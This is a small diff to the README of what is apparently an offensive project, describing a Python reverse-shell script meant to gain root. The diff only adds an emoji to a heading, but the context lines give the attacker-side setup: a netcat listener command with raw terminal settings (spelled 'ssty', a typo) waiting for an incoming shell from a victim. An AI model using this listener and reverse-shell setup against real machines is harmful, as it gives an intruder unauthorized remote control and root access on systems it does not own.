@@ -9,7 +9,7 @@ a hole for a attacker to get in to.
 This project contains a python file that starts a revers shell attack wich can be used as a
 exploit to gain root 🌳.
 
-# How to start the attack
+# How to start the attack ⚔
 start by listening on the attackers side 
 command : ssty raw -echo; (stty size; cat) | nc -lvnp port -s IPaddr
 
